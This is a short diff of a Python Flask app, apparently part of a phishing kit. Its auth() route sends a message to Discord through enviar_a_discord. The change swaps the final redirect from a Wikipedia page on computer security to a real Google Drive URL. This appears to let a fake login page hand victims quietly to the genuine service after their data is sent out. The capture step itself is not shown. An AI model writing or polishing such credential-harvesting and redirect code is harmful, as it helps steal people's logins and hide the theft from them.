@@ -88,7 +88,7 @@ def auth():
     enviar_a_discord(mensaje_discord)
     
     # Redirigir a un sitio seguro
-    return redirect("https://es.wikipedia.org/wiki/Seguridad_inform%C3%A1tica")
+    return redirect("https://drive.google.com/drive/?dmr=1&ec=wgc-drive-[module]-goto")
 
 if __name__ == "__main__":
     app.run()
